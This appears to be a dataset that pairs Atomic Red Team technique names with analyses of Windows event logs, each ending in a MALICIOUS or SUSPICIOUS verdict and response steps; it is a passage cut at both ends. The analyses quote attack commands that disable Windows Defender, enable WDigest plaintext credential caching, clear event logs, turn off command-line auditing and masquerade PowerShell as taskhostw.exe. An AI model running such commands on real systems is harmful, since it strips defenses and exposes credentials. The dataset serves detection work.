5. **Review Security Logs and Processes:** Ensure that security logs retention policies are reviewed to mitigate similar future incidents.
6. **Communication:** Alert stakeholders about potential impacts and keep them informed of mitigation steps.

Additionally, consider retraining staff responsible for monitoring if the suspicious activities were initially overlooked or providing them with updated detection rules for suspicious PowerShell activities."
Tamper with Windows Defender ATP using Aliases - PowerShell,"Based on the logs provided, here is the analysis of potentially suspicious or malicious activity:

### Observations

1. **Clearing of Event Logs:**
   - There are multiple instances of the event log being cleared (Event ID 104), including the `System`, `Windows PowerShell`, and `Security` logs. This action is initiated by the user `admin_test`.
   - Log clearing can be an indicator of malicious activity, as attackers often delete logs to cover their tracks.

2. **Time Manipulation:**
   - There is evidence of time being changed on this host (Event ID 4616 in Security log and Event ID 1 in System log by `svchost.exe`). Malicious actors can manipulate time to degrade event correlation or to simulate legitimate activities.

3. **PowerShell Execution:**
   - There is an execution of PowerShell with the command line that adjusts several security preferences (`Set-MpPreference` commands). These commands adjust Windows Defender's behavior, such as disabling real-time monitoring, behavior monitoring, script scanning, and others, effectively reducing system security and indicating potential malicious intent.

4. **High Privilege Actions:**
   - The user `admin_test` has been observed with high privilege actions, as seen in events with Event ID 4672 that show usage of elevated privileges such as `SeDebugPrivilege`, `SeRestorePrivilege`, etc.

5. **Processes Executed with High Integrity Level:**
   - Several processes, including PowerShell, are being run with `High` integrity level by the user `admin_test`. This further reinforces the possibility of unauthorized or suspicious high-level activities.

6. **Windows Defender State:**
   - The Windows Defender service is reported multiple times as being in the ""SNOOZED"" state, potentially disabled due to the PowerShell command, signaling possibly compromised system defenses.

### Risk Assessment

The logs show a pattern consistent with potential malicious behavior including:
- Log tampering.
- Time manipulation, which might be used for tampering temporal event evidence.
- Unauthorized disabling of system defenses.

### Resolution

Based on the findings, the activity can be labeled as **MALICIOUS**. There are signs indicative of unauthorized activities that seek to obscure actions, disable security defenses, and manipulate system time, potentially reflecting an attempted or successful intrusion or compromise.

### Recommendations

- **Immediate Incident Response:**
  - Initiate a detailed forensic investigation to understand the full extent of activities performed by `admin_test`.
  - Review user permissions and consider disabling or reducing `admin_test`'s privileges until clarification.
  
- **Log Monitoring:**
  - Reinstate robust monitoring of logs and implement alerts for unusual events like log clearing and changes in system time.
  
- **System Audit:**
  - Conduct a full system audit for other signs of compromise.
  - Check for other compromised hosts within the network if this host was part of a broader attack.
  
- **Security Posture:**
  - Investigate how the security preferences were changed and if similar configurations exist across other systems.
  - Ensure adequate security measures are re-established and enforced across the network, especially relating to PowerShell execution policies and Windows Defender settings."
Modify registry to store logon credentials,"Upon reviewing the provided Windows event logs, several notable events stand out that may indicate malicious behavior or suspicious activities:

1. **Log Clearing Events**: 
   - Security Event ID 1102 and System Event ID 104 indicate that logs were cleared on multiple channels (Security, System, and Windows PowerShell) by the user ""admin_test."" Clearing logs is often indicative of an attempt to hide malicious activity, although it could also be conducted for legitimate maintenance purposes. This is particularly suspicious when done across different logs in a short time frame.

2. **Time Change Events**: 
   - Multiple Event ID 4616 entries show system time being changed. Unauthorized time changes can be used to manipulate timestamps in logs, often to obfuscate the sequence of events or align malicious activities with valid timestamps.

3. **Registry Modification for Credential Theft**:
   - A Sysmon Event ID indicates the execution of ""cmd.exe"" with the command `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f`. This command enables WDigest credential caching, thereby exposing plaintext credentials in memory, which is a common technique used by attackers for credential theft.

4. **Suspicious Process Execution**:
   - Multiple executions of ""wevtutil.exe cl"" across different logs (Sysmon logs) indicate clearing of event logs. The command `wevtutil cl` is used to clear event logs and is executed multiple times by the ""admin_test"" user.

5. **Use of Hostname and Whoami**:
   - Execution of ""HOSTNAME.EXE"" and ""whoami.exe"" in quick succession might suggest situational awareness commands executed by an attacker or a script to gather information about the compromised environment.

6. **High Integrity Level Executions**:
   - Processes such as ""wsmprovhost.exe"" and ""cmd.exe"" executed with a high integrity level under the user context of ""admin_test"" suggest activities performed with elevated privileges, which could indicate privilege escalation or administrative tasks.

Given these findings, the activities logged in the event logs are suspicious and indicate potential compromise, specifically reflecting techniques used by attackers to evade detection and conduct credential harvesting. These observations warrant further investigation into the user ""admin_test,"" potential unauthorized access, and the actions taken by this user in the context of the logged events.

### Resolution: SUSPICIOUS

### Recommended Actions:
- Initiate a detailed investigation into the user account ""admin_test"" to verify the legitimacy of actions taken.
- Review and verify any scheduled tasks or automated scripts associated with ""admin_test.""
- Conduct a thorough audit and analysis of the system for signs of compromise or unauthorized access.
- Implement tighter monitoring and alerting on sensitive operations, such as registry changes and log clearings.
- Inform appropriate IT and security personnel to ensure immediate action and to secure potentially impacted systems."
Disable Windows Change Password Feature,"Upon reviewing the presented Windows event logs, several patterns and events warrant closer examination. Here is a detailed analysis of the noteworthy findings:

### Suspicious or Anomalous Behavior:

1. **Clearing of Event Logs:**
   - **Security Log Cleared:** 
     - Event ID 1102 indicates the Security log was cleared by `admin_test`. This can be a common action taken by an attacker to cover their tracks.
     - Process ID `6632` corresponds to `C:\Windows\System32\wevtutil.exe`, which was used to clear the logs.

   - **System Log Cleared:**
     - Event ID 104 suggests the System log was cleared.
     - Process ID `2916`, also linked to `wevtutil.exe`, was responsible for this action.

   - **Clearing associated with a high integrity level:** Indicates potential misuse of administrative privileges.

2. **Registry Modification:**
   - The use of `cmd.exe` to run `reg add` to modify registry settings (disabling password change) suggests an attempt to enforce a policy change surreptitiously, which can be a red flag for malicious intent. 
     - `cmd.exe` attempted to modify the registry with `reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableChangePassword /t REG_DWORD /d 1 /f`.

3. **Time Manipulation:**
   - Event ID 4616 indicates a time change event, which can sometimes be indicative of attempts to manipulate time-dependent logging or controls.
   - This event shows svchost.exe as the process changing the system time, which could be legitimate or indicative of an attempt to obscure log timestamps.

4. **Execution of Built-in Utilities:**
   - Multiple executions of `wevtutil.exe` and `whoami.exe` indicate potential enumeration and log manipulation activities typical in initial phases of a compromise.
   - The consistent use by the same user account `SERVER002\admin_test`, may suggest an insider threat or compromised credentials.

### Assessment:

The logs reflect a series of actions and patterns that raise suspicions of malicious activity:
- The clearing of Security and System event logs by the same user indicates an intentional attempt to erase tracks.
- Registry modifications aimed at disabling password changes, if not part of standard administrative activity, can be a part of persistence tactics by attackers.
- Executions of system utilities like `wevtutil` and `whoami` suggest efforts to manipulate logs and enumerate system information, respectively.
- The modification of system time may indicate attempts to confuse logging or monitoring mechanisms.

### Conclusion:

**Resolution: MALICIOUS**

Based on the evidence of typical obfuscation and persistence techniques, such as log clearing, registry modification, and time manipulation, the activities recorded in the logs strongly suggest a potential security breach with malicious intent. 

### Recommendations:

1. **Immediate Actions:**
   - Investigate the credential use and possible compromise of `admin_test`.
   - Deploy a full malware scan and forensic analysis on the system `Server002`.
   - Monitor for any further suspicious behavior from `admin_test` or other administrative accounts.

2. **Long-term Actions:**
   - Review permissions and logging policies to ensure that high-privilege actions are well monitored.

Launches an executable using Rundll32 and pcwutl.dll,"Upon analyzing the provided Windows event logs, several observations and potential issues were noted.

### Detailed Analysis:

1. **Log Clearing Activity:**
   - In the System log, Event IDs 104 and 1102 indicate that the Windows Event Logs (System, Windows PowerShell, and Security logs) were cleared by the user `admin_test` on `Server002`. Log clearing can be a red flag for malicious activity as it may indicate an attempt to cover tracks after unauthorized actions.

2. **Suspicious Process Executions:**
   - Multiple instances of `wevtutil.exe` (Eventing Command Line Utility) were observed clearing logs across different channels. This utility is often used by attackers to erase their footprints.
   - `cmd.exe` was executed with rundll32 to start `notepad.exe`, which is an uncommon pattern and could be indicative of suspicious behavior, especially when executed in a context aiming to avoid detection.

3. **Privileged User Activity:**
   - The security log shows that the user `admin_test` was granted a list of high-level privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others under Event ID 4672. Such privileges could allow the user to execute almost any action on the system without restrictions.

4. **Time Changes:**
   - There are multiple instances of time changes recorded in Event ID 4616. Large and abrupt system time changes can sometimes be used to manipulate time-based security protocols or to evade timestamp-based logging.

5. **Microsoft EdgeUpdate Activity:**
   - A series of events related to Microsoft EdgeUpdate operations seem normal as they relate to software updating processes. However, the use of executables from temporary directories like `C:\Program Files (x86)\Microsoft\Temp` is atypical and could highlight potential misuse.

### Assessment:

- **Indicators of Malicious Activity:**
  - The clearing of event logs is a significant indicator of potential malicious activity, as it commonly suggests an attempt to hide unauthorized or covert actions.
  - The execution of potentially obfuscated commands and unusual child processes (like using `rundll32` in this context) could also indicate malicious intent.

- **Risks:**
  - Potential undetected malicious software may be present on the host that could have been installed or used by the `admin_test` account.
  - There is a risk of privilege abuse due to the broad capabilities granted to the `admin_test` account.

### Recommendation and Resolution:

- **Resolution:** **SUSPICIOUS**

Based on the analysis, the logs contain suspicious activities that warrant further investigation. Immediate actions should include:
- Conducting a full security audit of the `Server002` and the `admin_test` account.

- Implementing tighter access control measures and continuous monitoring to prevent log clearing.
- Scanning for malware or malicious scripts that may have evaded detection using these observed techniques.
"
Delete Microsoft Defender ASR Rules - InTune,"### Detailed Analysis:

Upon reviewing the logs provided, several activities stand out as potentially suspicious or indicative of malicious behavior:

1. **Log Clearing Events**:
   - The logs show multiple instances of the `wevtutil` command being used to clear event logs, as evidenced by the `EventID` 104 (System) and 1102 (Security) log entries. Specifically, logs such as:
     - `{""EventID"":""104"",... ""Channel"":""System""...}`
     - `{""EventID"":""1102"",... ""Channel"":""Security""...}`
     - `{""EventID"":""104"",... ""Channel"":""Windows PowerShell""...}`
   - The `wevtutil cl` command is often associated with attempts to cover tracks after executing potentially malicious activities, as it clears specified event logs.

2. **PowerShell Usage**:
   - There are several indications in the PowerShell and Sysmon logs of a PowerShell script being executed, which appears to be modifying registry keys related to Windows Defender policies. The script modifies keys under `HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager`.
   - The content of the PowerShell script is attempting to create and remove registry values, which can be a red flag when it involves security settings. This activity might indicate an attempt to bypass or disable certain security features.

3. **Privilege Escalation**:
   - Event ID 4672 in the Security logs indicates the registration of special privileges such as `SeDebugPrivilege`, `SeImpersonatePrivilege`, and `SeSecurityPrivilege`, among others. These privileges provide substantial control over the system and are often used in privilege escalation attacks.

4. **Suspicious Timing**:
   - The timing of events is highly concentrated (multiple events within seconds), especially surrounding the clearing of logs and execution of PowerShell scripts.

5. **Account Involved**:
   - The activities are associated with the user `admin_test`, which implies that a privileged account is possibly being used or compromised to execute these activities.

### Assessment:

Based on the information from the logs, the activities observed are not typical of normal administrative tasks, especially considering the usage of log-clearing commands immediately following what appears to be potentially unauthorized registry modifications. Administrative actions that involve manipulating security-related registry entries and subsequently clearing event logs suggest attempts to obfuscate malicious activities.

### Final Resolution:

**MALICIOUS** - The logs strongly indicate malicious behavior, characterized by potential attempts to clear logs, execute unauthorized changes to security configurations, and leverage elevated privileges. Immediate investigation into the account activity for `admin_test` should be undertaken, along with an assessment of system integrity and security settings.

### Guidance on How to Proceed:

1. **Contain and Isolate**: If feasible, isolate the system (Server002) from the network to prevent further potential malicious activity.
2. **Investigate the Account**: Check recent activity related to the `admin_test` account for irregularities, including changes to authorization and access logs.
3. **Audit the Scripts**: Review PowerShell command history and scripts to identify unauthorized or suspicious scripts that might have been executed.
4. **Review and Restore Security Settings**: Examine and restore default security settings, particularly those related to Windows Defender and related policies.
5. **Implement Monitoring**: Enhance monitoring on critical endpoints for similar log-clearing activities and use of administrative privileges.
6. **Conduct a Full System Audit**: Consider full forensic analysis to ensure no backdoors or further compromises exist."
Disable Windows Command Line Auditing using Powershell Cmdlet,"Upon analyzing the provided Windows event logs, there are several concerns that warrant further investigation:

1. **Event Log Clearing**:
   - The security logs (EventID: 1102) and corresponding sysmon logs indicate that the event logs were cleared by a user named ""admin_test"". The use of `wevtutil.exe` to clear logs is suspicious, especially from a high integrity level (as shown by sysmon events with Image `C:\Windows\System32\wevtutil.exe` clearing logs).
   - Logs were cleared from channels like Security, System, and Windows PowerShell, which can be an indicator of an attempt to hide malicious activity.

2. **Time Manipulation**:
   - The time change events (EventID: 4616 from Security logs) indicate that the system time was altered. Rapid changes in time configuration can be used to confuse or manipulate time-based security measures and logs.

3. **Suspicious PowerShell Activity**:
   - A PowerShell command was executed: `New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 0`, which disables auditing of command line arguments. This is a typical behavior to reduce logging and possibly cloak subsequent malicious commands.

4. **Observed File Execution**:
   - Frequent execution traces of EdgeUpdate processes and executables without clear correlation to known scheduled updates could be benign, given that Edge often performs self-updates. Yet, the correlation to concurrent suspicious activity (log clearing and time alteration) raises potential red flags.

5. **No apparent compromise signs**:
   - While EdgeUpdate logs and processes running could be part of regular update activities, given the context of log clearance and system alterations, it would be prudent to verify that these processes are legitimate and not being used as a cover for malicious activities.

### Assessment:

Given the combination of log clearing, time manipulation, and specific PowerShell activity aimed at altering audit settings, there is strong evidence suggesting potentially malicious activity. The actions taken by the account ""admin_test"" are suspicious and may indicate an attempt to cover tracks, which is indicative of malicious intent.

### Resolution: **MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Isolation**: Isolate the affected host (Server002) to prevent further undesirable activity within the network.
2. **Review ""admin_test"" Account**: Conduct a thorough review and validation of all activities associated with the ""admin_test"" account for legitimacy.
3. **Malware and Threat Detection**: Conduct a comprehensive malware scan and forensic analysis to identify any persisted threats or unauthorized changes.
4. **Restore Security Settings**: Re-enable auditing for command line arguments if it has been disabled.
5. **Incident Report and Analysis**: Document all findings and actions taken for a detailed incident report. Consider this event potentially part of a larger compromise effort.
6. **Network Wide Audit**: Examine any other systems for similar patterns to detect if this is an isolated incident or part of a broader attack.

Disable Remote Desktop Anti-Alias Setting Through Registry,"Upon reviewing the provided log entries, several indicators suggest suspicious and potentially malicious activity on the host ""Server002."" Below are the key observations:

1. **Clearing of Event Logs:**
   - The Security log entry with EventID 1102 indicates that the event log was cleared by the user ""admin_test.""
   - The System log entries with EventID 104 indicate that the System and Windows PowerShell logs were also cleared by the same user.

   Clearing of logs can be a strong indicator of an attempt to cover up malicious actions, as it's uncommon for legitimate users to clear logs without specific reasons, such as troubleshooting under controlled circumstances.

2. **Wevtutil and Command Line Usage:**
   - Frequent execution of the `wevtutil.exe` to clear logs for various channels (Microsoft-Windows-Sysmon/Operational, System, Security, and Windows PowerShell) is recorded. The command-line arguments suggest an aggressive clearing of logs, corroborating the malicious intent behind log clearing.
   - Usage of `cmd.exe` to modify registry keys related to Terminal Services (`DisableRemoteDesktopAntiAlias`) via `reg.exe` commands. Such modifications could be an attempt to manipulate system settings, possibly to aid remote desktop activities that bypass certain security features.

3. **Unusual Process Execution:**
   - The usage of several utility executables like `whoami.exe`, `hostname.exe`, and `conhost.exe` which, in isolation, might be benign; however, their usage pattern alongside other suspicious activities suggests reconnaissance or system profiling actions by an attacker to understand the environment.

Assessing these activities collectively, the combination of log clearing, registry modifications, and information gathering tools strongly indicates an unauthorized misuse of administrative privileges with potentially malicious intent.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Initiate an incident response process immediately to contain the potential breach.
- Isolate the affected host ""Server002"" from the network to prevent further damage or data exfiltration.
- Conduct a thorough forensic investigation to determine the entry point and scope of the compromise.
- Review and enhance logging and monitoring on all critical systems to detect similar activities in the future.
- Audit user accounts and privileges to limit unnecessary administrative access and address any escalations used in this incident.
- Consider consulting with third-party cybersecurity experts if resources are available, to assist in the detailed analysis and remediation efforts."
Change Powershell Execution Policy to Bypass,"### Detailed Log Analysis:

1. **Wevtutil.exe Activity**:
   - Multiple instances of `wevtutil.exe` were executed with the command line arguments to clear the logs for different channels (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). These activities were all executed under the `SERVER002\admin_test` account with high integrity level.
   - Clearing event logs, especially the Security log, is a strong indicator of malicious intent as attackers often seek to cover their tracks after performing unauthorized actions.

2. **Changed Execution Policy via PowerShell**:
   - A command to change the PowerShell execution policy to `Bypass` was executed. The command: `""powershell.exe"" & {Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine}` suggests an attempt to facilitate the execution of potentially harmful scripts without being blocked by the PowerShell execution policy.

3. **Execution of Hostname and Whoami**:
   - Tools like `hostname.exe` and `whoami.exe` were run. These are commonly used to gather information about the system and the user. While not inherently malicious, their execution after log clearing and policy change raises suspicion.

4. **EdgeUpdate.exe Activity**:
   - A significant amount of `MicrosoftEdgeUpdate.exe` related activity is noted. Although this can be standard behavior for system maintenance and updates, the combination with log clearing and PowerShell activity warrants further investigation.

5. **Time Stamps and Time Set Events**:
   - There are events indicating the time being set (security audit 4616). While this can happen during system time synchronization, the fact that these occur around the time of suspicious log clearing needs to be examined in context with other events.

### Assessment:
- The presence of log clearing using `wevtutil.exe`, a PowerShell execution policy change to `Bypass`, and the execution of reconnaissance commands like `whoami` and `hostname` all together suggest malicious activity. These actions potentially point to an attacker attempting to perform actions undetected on the host by clearing logs to erase evidence of their activity.

### Threats or Risks:
- **Compromise and Persistent Presence**: The execution policy change suggests an attempt to execute scripts that might place the system at risk of further compromise.
- **Data Integrity and Confidentiality**: Clearing logs not only conceals actions but leaves IT teams uninformed about the full scope of the issue.

### Guidance on How to Proceed:
- Immediately isolate the server from the network to prevent any potential lateral movement or data exfiltration.
- Perform a thorough forensic review to understand the full impact and scope of the compromise.
- Check for any unauthorized changes, users, or new scheduled tasks on the affected host.
- Review and possibly revise security policies related to PowerShell execution restrictions and logging configuration.

### Conclusion:
Given the analysis, the logs contain signs of unauthorized and potentially malicious activity, categorizing this analysis as **MALICIOUS**. Act promptly to contain and remediate."
Create and start Hyper-V virtual machine,"After analyzing the provided Windows event logs, several indicators suggest that the activity is indeed suspicious and warrants further investigation:

1. **PowerShell Activity:**
   - There are multiple PowerShell events, all of which indicate the creation of a virtual machine with Secure Boot disabled:
     ```powershell
     powershell.exe & {$VM = ""Atomic VM""; New-VM -Name $VM -Generation 2; Set-VMFirmware $VM -EnableSecureBoot Off; Start-VM $VM}
     ```
   - The use of PowerShell to manipulate VM settings and especially disabling secure boot can be indicatively malicious, as attackers sometimes disable security features to maintain persistent access or bypass defenses.

2. **Event Log Clearance:**
   - The `System`, `Security`, and `Windows PowerShell` logs have all been cleared by a user named ""admin_test"" immediately before the PowerShell activity began:
     ```json
     ""UserData"":{""LogFileCleared"":{""SubjectUserName"":""admin_test"", ""Channel"":""System""}}
     ```
   - Clearing of logs is a common tactic used by attackers to cover their tracks after performing unauthorized actions.

3. **Sysmon Entries:**
   - In the Sysmon logs, `wevtutil.exe` was used multiple times to clear logs:
     ```json
     ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl System""
     ```
   - Similar to the manual log clear events, using system utilities to clear logs is suspicious and indicative of an attempt to hide activity.

4. **Timing and Sequence:**
   - The sequence and timing of events, specifically the clearing of logs followed by the PowerShell execution, suggest a deliberate attempt to perform unauthorized activities on the system.

5. **Lack of Justification for Operations:**
   - The actions related to VM manipulation and log clearance were performed without any apparent legitimate administrative reason. Such activities are often flagged when performed in a non-transparent or unexpected manner.

### Assessment:
Based on the evidence, the activities observed in the logs, particularly the clearing of logs, execution of PowerShell commands to disable Secure Boot on a VM, and the use of system utilities to hide actions, point towards potential malicious activity.

### Resolution:
**SUSPICIOUS** - While the logs may not definitively prove malicious intent without additional context (like correlating with known malware signatures or external threat intelligence), the overall sequence and nature of activities are highly suspicious and indicative of potential unauthorized or malicious activity.

### Guidance:
- **Immediate Action:**
  - Investigate the user ""admin_test"" and check if the activity aligns with their job role and responsibilities.
  - Review audits and alerts for other systems to determine if there is a wider scope of activity involving this user.
  - Verify the origin of the PowerShell script and check for known Indicators of Compromise (IOCs).

- **Long-term Recommendations:**
  - Implement stricter access controls and logging mechanisms to monitor similar activities.
  - Consider implementing a Security Information and Event Management (SIEM) solution to correlate anomalous behavior across different logs.
  - Educate administrators on the significance of log activity and encourage reporting suspicious behavior immediately."
CMSTP Executing Remote Scriptlet,"### Analysis:

1. **Cleared Event Logs:**
   - The **System**, **Application**, **Windows PowerShell**, and **Security** event logs have been cleared by the user `admin_test` on `SERVER002`. The events for clearing these logs are captured as follows:
     - **System Log Cleared:** Event 104 at 13:12:04.5980907 by `admin_test`.
     - **Windows PowerShell Log Cleared:** Event 104 at 13:12:04.7858420 by `admin_test`.
     - **Security Log Cleared:** Event 1102 at 13:12:04.7156563 by `admin_test`.
   - The clearing of event logs, especially security logs, is a significant indicator of malicious behavior, as it may suggest an attempt to remove traces of potentially unauthorized or malicious activities.

2. **Suspicious Command Execution:**
   - ***Command Execution via cmd.exe:***
     - Usage of `cmstp.exe` tool with an INF file from a temporary directory: `""cmd.exe"" /c cmstp.exe /s ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.003\\src\\T1218.003.inf""`.
     - The `cmstp.exe` is being executed possibly to bypass UAC (User Account Control) or perform privilege escalation, commonly used in living off the land attack techniques. The use of Atomic Red Team's techniques or file structures is often indicative of security testing or potentially an attacker using these resources maliciously.

3. **System and Security Checks:**
   - Several system utility executables such as `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and other utilities like `conhost.exe` are run frequently.
   - These activities might be part of regular administrative tasks. However, considering the log clearance and the `cmstp.exe` usage, they could support lateral movement or reconnaissance efforts by an unauthorized user.

4. **Edge Update Execution:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and related processes running under the `NT AUTHORITY\SYSTEM` account: This is a common process for Edge but should be validated to ensure the updates and executable paths are legitimate.
   - While these activities in isolation might not represent malicious intent, their occurrence around the time of log clearing and suspicious command execution raises concerns about their legitimacy.

### Assessment and Recommendation:

**Assessment:** Given the evidence, the behavior exhibited in the logs is deemed SUSPICIOUS. The combination of event log clearance, suspicious command execution with `cmstp.exe`, and frequent use of system utilities could indicate unauthorized activities or security testing.

**Recommendations:**
- Conduct a thorough investigation of the user `admin_test`'s activities to ascertain if the actions were legitimate or part of intentional testing.
- Review and, if necessary, terminate ongoing suspicious processes.
- Verify the integrity of the system's security configurations and reevaluate user permissions, especially those with administrative rights like `admin_test`.
- Enhance monitoring to detect similar activities in the future and re-evaluate audit logging policies to prevent unauthorized log clearance.
- Conduct a follow-up of the suspicious activities to confirm or alleviate concerns about potential compromise.

**Resolution:** SUSPICIOUS - Further investigation warranted."
Suppress Win Defender Notifications,"Upon analyzing the provided logs, several elements stand out indicating potentially suspicious behavior that warrants further investigation:

1. **Log Clearance Events**: 
   - There are multiple events indicating the clearing of logs using `wevtutil.exe` (Event IDs 1102 in Security Logs, 104 in System logs). This is commonly associated with an attempt to cover tracks by a malicious actor. The timestamps show this was done multiple times in quick succession for different channels, suggesting deliberate log manipulation.

2. **Time Change Events**: 
   - The Event IDs 4616 in Security Logs indicate that system time was altered just before the log clearance events took place. Changing system time can be a tactic used by attackers to defeat time-based detection or correlation of log entries.

3. **Use of Administrative Privileges**: 
   - The events for `admin_test` user show the assignment of several high-level privileges (Event ID 4672), including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, right around the time of logs being cleared. This could be indicative of privilege escalation or misuse.

4. **Suspicious Command Line Execution**:
   - The usage of `cmd.exe` to alter registry settings related to Windows Defender notifications (Sysmon event record 17981 and following) is suspicious. These modifications may potentially be aimed at reducing the system's ability to notify users about security-related issues.

5. **Unusual Process Activity**:
   - The presence of many instances of `wevtutil.exe` and `conhost.exe` (Sysmon Event ID 1 and 5 logs) is atypical. The former is often used for legitimate log management but is leveraged by attackers for tampering with logs.

Based on these findings, the events logged indicate a combination of behaviors that are often associated with malicious activity: log clearing, unusual privilege escalation, suspicious command executions altering security settings, and potential time manipulation. 

**Resolution**: SUSPICIOUS

### Guidance on How to Proceed:
- **Immediate Monitoring**: Closely monitor the activities performed by the user account `admin_test` and verify if the observed actions were legitimate.
- **Conduct a Forensic Analysis**: Implement a deeper forensic investigation on `Server002` to identify any potential compromise or unauthorized access.
- **Evaluate Access Controls**: Review group policies and privilege assignments related to `admin_test` and restrict unnecessary privileges.
- **Check for Indicators of Compromise (IOCs)**: Assess any other systems or logs that might correlate with this activity.
- **Prepare for Incident Response**: If the investigation validates the suspicion of malicious activity, prepare to follow incident response procedures as per organizational policy.

Given the data and analysis provided, the next steps will be crucial in determining whether further actions, potentially up to and including system containment and remediation, are necessary."
Masquerading - powershell.exe running as taskhostw.exe,"Upon analyzing the provided Windows event logs, several key indicators suggest suspicious and potentially malicious activities:

1. **PowerShell Execution from an Unusual Location**:
   - Events from the Windows PowerShell logs indicate that a PowerShell session was started with the host application `C:\Users\admin_test\AppData\Roaming\taskhostw.exe`. Taskhostw.exe should typically reside in `C:\Windows\System32`, not in the AppData directory. This suggests potential misuse or masquerading of legitimate processes to execute potentially harmful scripts.

2. **Event Log Clearing**:
   - Both system logs and security logs (`EventID: 104` and `EventID: 1102`, respectively) show that logs were cleared by the user `admin_test`. This action is a common tactic used by attackers to cover their tracks post-intrusion.

3. **Suspicious Command Execution**:
   - Sysmon logs reveal a suspicious command executed by `cmd.exe` which includes copying `powershell.exe` to a different location and executing it as `taskhostw.exe`. The command used is `""cmd.exe"" /c copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y & cmd.exe /K %APPDATA%\taskhostw.exe`.

4. **Elevated Privileges and Credential Access**:
   - There are several Security Auditing logs (`EventID: 4672`) showing that the `admin_test` account was granted a wide range of privileges, including SeDebugPrivilege, which is often abused by attackers for controlling system processes and escalating privileges.
   - Additionally, there are multiple event logs (`EventID: 5379`) indicating failed credential access attempts, which could denote attempts to exfiltrate user account details or authenticate against a remote service.

Based on the above findings, our analysis suggests that the logs contain signs of compromise, particularly highlighting privilege escalation attempts, suspicious process execution, and the potential clearing of logs to hide activities.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediately isolate the affected system (`Server002`) from the network to prevent further spread or exfiltration of data.
- Conduct a thorough forensic analysis to understand the extent of the compromise and identify any persistence mechanisms that may have been installed.
- Review and monitor other systems for similar indicators of compromise.
- Reset all credentials for `admin_test` and review all privileged accounts for unauthorized access or changes.
- Review firewall and network logs for suspicious outbound activity from `Server002` during the timeframe of the compromise.
- Consider engaging with a third-party cybersecurity firm if internal resources are insufficient to handle the breach.
"
Load Arbitrary DLL via Wuauclt (Windows Update Client),"After conducting a detailed review of the provided logs, several pieces of information indicate potentially suspicious behavior that might warrant further investigation.

### Suspicious Activities:

1. **Event Log Clearing:**
   - A Security log (Event ID 1102) indicates that the event logs were cleared by the user `admin_test`. 
   - In the System log, two occurrences (Event ID 104) also show that logs for the ""System"" and ""Windows PowerShell"" channels were cleared. The user involved (`admin_test`) is a known user on the system.
   - Clearing event logs, especially without a clear operational reason, is often performed to cover up malicious activity.

2. **Unusual Use of `wevtutil`:**
   - There are several processes involving `wevtutil.exe` (Event IDs: 17990, 17994, 17998, 18002, 18006, 18010, 18014, and 18018). `wevtutil` is used to manage event logs, and its execution alongside the event log deletions is suspicious.
   
3. **Execution of PowerShell and `conhost.exe`:**
   - There is an execution instance of `powershell.exe` (Event ID: 17988). While PowerShell is often used for legitimate administrative purposes, it is also a common tool used by attackers for executing malicious scripts.
   - Each instance of `wevtutil.exe` was followed by the spawning of `conhost.exe`, which could indicate that command-line operations or console operations are being conducted in the background.

4. **Suspicious Command Execution:**
   - An entry in the Sysmon log records `cmd.exe` executing a command with `wuauclt.exe`, indicating the use of a known bypass via the Windows Update client to potentially load malicious DLLs (`calc.dll` in the provided directory path). This is indicative of a technique sometimes referred to as `Living off the Land` binaries (LOLBins) used in attacks.

5. **System Services and Privileged Operations:**
   - Event IDs 4624 and 4672 in the Security logs reflect privileged operations by the ""SYSTEM"" account, with a comprehensive list of privileges, including `SeDebugPrivilege`, which can be leveraged for nefarious purposes. This alone is not suspicious but needs context, given the surrounding activities.

### Assessment:

Based on these observations, the activities in the logs appear to be coordinated and plausibly malicious, with multiple signs indicating potential compromise and attempts at persistence or evasion:

- Clearing event logs is a strong indicator of malicious intent.
- Coordination between event log clearing tools (`wevtutil`) and subsequent process spawning activities suggests potential cover-up attempts or data persistence setup.
- Execution of `cmd.exe` and `wuauclt.exe` with suspicious arguments potentially involving side-loading a DLL (`calc.dll`) raises further red flags.

### Resolution:

MALICIOUS - Given the evidence of deliberate log clearing, suspicious use of command-line tools, especially with known LOLBins, the behavior is consistent with attempts to obfuscate operational tracks and potential malicious setup or attack execution. It is advised to escalate this incident for further investigation, involving a deeper forensics analysis of the host, and the surrounding network for potential lateral movement or additional compromise.

### Recommendations:

- An immediate containment and forensic analysis should be carried out to prevent further damage.
- Review access and carefully audit actions of the user `admin_test`.
- Implement enhanced auditing and monitoring to ensure any further unauthorized or malicious activities are detected promptly.
- Consider changing credentials and enforcing stricter access controls for affected accounts and systems."

DLP Evasion via Sensitive Data in VBA Macro over email,"Upon reviewing the Windows event logs provided, several behaviors stand out as noteworthy:

1. **Command Line Usage of `wevtutil.exe`:** There are multiple instances (EventIDs 1 in Sysmon logs) of `wevtutil.exe` being executed by the user ""SERVER002\admin_test"", with the command-line arguments indicating commands to clear logs (e.g., `""C:\\Windows\\system32\\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational` and other channels like Application, Security, etc.). The use of `wevtutil.exe` to clear logs is suspicious, especially when performed without proper administrative context or justification. This tool is typically used to manage event logs, and its usage for clearing logs is associated with malicious attempts to cover tracks.

2. **Execution of PowerShell with Potential Indicator of Compromise:** There is evidence of PowerShell being executed with a `Send-MailMessage` command, which is employed to send an email with an attached file (`AtomicRedTeam`). This could indicate scripting for potential exfiltration or testing using the Atomic Red Team framework, which is used to simulate adversary behavior.

